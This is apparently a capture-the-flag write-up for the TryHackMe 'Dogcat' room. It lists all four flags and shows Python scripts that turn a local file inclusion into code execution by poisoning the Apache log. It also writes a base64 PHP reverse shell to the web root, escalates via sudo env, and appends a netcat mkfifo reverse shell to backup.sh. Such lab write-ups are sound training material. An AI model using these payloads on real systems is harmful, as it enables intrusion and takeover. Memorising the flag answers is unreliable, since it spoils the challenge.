# Dog Cat

## Task 1  Dogcat
+ What is flag 1?`THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`
+ What is flag 2?`THM{LF1_t0_RC3_aec3fb}`
+ What is flag 3?`THM{D1ff3r3nt_3nv1ronments_874112}`
+ What is flag 4?`THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`

## Hands on CTF 
### Reconnaise
+ Enumeration using nmap `nmap -sC -sV MACHINE_IP > nmap_log`
+ Enumerating http and found LFI on `?view=` parameter try to read `index.php` using `php://filter/read=dogs/../convert.base64-encode/resource=index`
+ Decode it analize the code it check if not have a parameter ext than it will added `.php` on the last include 
```php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['view'])) {
        if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
            echo 'Here you go!';
            include $_GET['view'] . $ext;
        } else {
            echo 'Sorry, only dogs or cats are allowed.';
        }
    }
```
+ So find our way to make LFI as RCE using checking `apache log file` and we found it `/var/log/apache2/access.log` 

### Weaponize
+ Create a simple python script `abuse.py` 
```python
import requests

uRL = 'http://10.10.164.84/?'
v = 'dogs/../../../../../var/log/apache2/access.log'
parameters = {'ext':'','view':v}
header = {
    'User-Agent':"<?php echo system($_GET['c']);?>"
}
r= requests.get(uRL, params=parameters, headers=header)
print(r.text)
```
+ Run it `python3 abuse.py` and now we got RCE using `dogs/../../../../../var/log/apache2/access.log&ext=&c={COMMAND}`
+ Using cyberchef encode `PHP Reverse Shell` to base64 and use simple python script `expt.py` to generate the file on target
```python
import requests

uRL = 'http://10.10.164.84/?'
v = 'dogs/../../../../../var/log/apache2/access.log'
payload ='echo PD9waHAKLy8gcGhwLXJldmV...[ more stuff ]...0KfQoKPz4= | base64 -d > /var/www/html/shell.php'
parameters = {'ext':'','view':v,'c':payload}
r= requests.get(uRL, params=parameters)
print(r.text)
```
+ Run it using `python exp.py` and the output will generate `shell.php` on `/var/www/html/`
+ Listen to the port we are setup on base64 at cyberchef and access the `http://MACHINE_IP/shell.php` to gain a revershell

### Escalation
+ Checking is user `www-data` have a sudo with `sudo -l` it's return `(root) NOPASSWD: /usr/bin/env`
+ Then we can use command `sudo env /bin/sh` and we got root shell on container
+ Time for loot. We can use `find / -type f -iname "*flag*" 2>dev/null`
```bash
/var/www/html/flag.php
/var/www/flag2_QMW7JvaY2LvK.txt
/root/flag3.txt

cat /var/www/html/flag.php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
cat /var/www/flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_RC3_aec3fb}
cat /root/flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}
```
+ We Still need to find flag 4. So we need to Evade from container
+ After some research we got file `backup.sh` on `/opt/backup` abuse the file using 
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.37.160 1234 >/tmp/f" >> backup.sh
```
+ Listen on port 1234 and we got real root terminal and loot for last flag on `/root`
```bash
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```